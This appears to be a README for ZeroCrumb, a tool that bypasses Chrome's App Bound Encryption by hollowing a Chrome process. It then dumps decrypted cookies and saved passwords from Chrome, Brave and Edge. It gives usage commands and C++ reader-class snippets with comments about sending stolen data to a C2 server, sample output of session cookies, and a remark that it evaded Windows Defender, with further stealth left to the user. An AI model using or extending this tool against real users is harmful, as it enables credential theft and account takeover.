
# ZeroCrumb

Dumping App Bound Protected Credentials & Cookies Without Privileges.

## Explanation

ZeroCrumb bypasses the Chrome Elevation Service by impersonating a Chrome instance using [Transacted Hollowing](https://github.com/hasherezade/transacted_hollowing/), Effectively allowing us to use the IElevator COM interface to decrypt the App Bound Key.

Then, The key dumper running the in the hollowed chrome instance will send the decrypted key back to ZeroCrumb via a [Named Pipe](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes).

After this, ZeroCrumb decrypts the cookies/passwords for the specified browser with the key fetched earlier.

## Merits With The Named Pipe Approach
Usage of named pipes in ZeroCrumb allows any program, As long as it can use the Windows API, To connect to the ZeroCrumb named pipe and read the App Bound Key from it. 

## Using ZeroCrumb As A Library
If you want to use ZeroCrumb as a library, You will need to compile a DLL that exports a function that does the hollowing of chrome with the key dumper. You might also need to embed the key dumper PE in the .rsrc section of the compiled DLL and later fetch it with the application resources Windows APIs.

## Usage
You can run this in any directory of your choice as long as the key dumper is in the same directory.
```
ZeroCrumb.exe <BROWSER_TYPE> <DUMP_TYPE>
```
```
Browser Types:
Chrome -> 0
Brave -> 1
Edge -> 2

Dump Types:
Cookies
Passwords
```

## Code Usage
ZeroCrumb provides an easy-to-use **CookieReader** & **PasswordReader** classes:
```cpp
    auto reader = new CookieReader(cookiesPath.c_str(), key);

    reader->initSqliteDb();
    reader->prepare(queries::cookies);
    reader->populateCookies();
    
    for (auto& cookie : reader->cookies) {
        string name = cookie->name;
        string site = cookie->site;
        string path = cookie->path;
        string cookieValue = cookie->cookie;
        // dump to file, send back to C2, etc...
    }
```

```cpp
    // keep in mind passwords aren't encrypted using the app bound key (yet)
    auto reader = new PasswordReader(passwordsPath.c_str(), key);

    reader->initSqliteDb();
    reader->prepare(queries::passwords);
    reader->populatePasswords();

    for (auto& password : reader->passwords) {

      auto name = password->name;
      auto site = password->site;
      auto passwordValue = password->password;
      // dump to file, send back to C2, etc...
}
```

## Depedencies
ZeroCrumb requires two [Vcpkg](https://vcpkg.io/) dependencies:
```
sqlite3
libsodium
```

## Output Example
```
$ ZeroCrumb.exe 0 Cookies
[*] Reading From Pipe...
App Bound Key: 980f8ea8af3299d966a26242.....
============
Name: SIDCC
Site: .google.com
Path: /
Cookie: AKEyXzXxD19T0KLMkrMC-eUXkrnEFi92OXq6rj1vydvmdL73olBVQGRQ4cG_hK5sqPhO1rLd1CM
============
Name: __Secure-1PSIDCC
Site: .google.com
Path: /
Cookie: AKEyXzXXC8_MNDlVbAaw512aXu-QJkl0uKNW66rhjeufotzoJhT3OPN5TuCQnfKS8l57_WGfDw
============
Name: __Secure-3PSIDCC
Site: .google.com
Path: /
Cookie: AKEyXzVVySM4FWl9itegCN2evcSmBvGc7_iXHqkKZ6VYPKmR--_LsHx1Aflar6SU4nyJiDaFq028
============
Name: udid
Site: .veepn.com
Path: /
Cookie: 0dd5b8bb-8c5b-47f3-87f9-1db8fa7d885f
============
```

## Notes
You can modify ZeroCrumb to work with any type of credential other than cookies & passwords.

## Issues
- Debug build doesn't output the correct key

## Disclaimer
This is by no means the most stealthy implementation of this bypass, It can get detected by checking for specific strings, hooking APIs, etc.

By the time I'm testing this, It got past Windows Defender but I haven't checked other AVs.

I'll leave making the bypass stealthier as an exercise for the user if this bypass implementation gets signatured in the future.

## Credits
[Transacted Hollowing](https://github.com/hasherezade/transacted_hollowing/) by [hasherezade](https://github.com/hasherezade/).

[App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/) by [Xaitax](https://github.com/xaitax/).
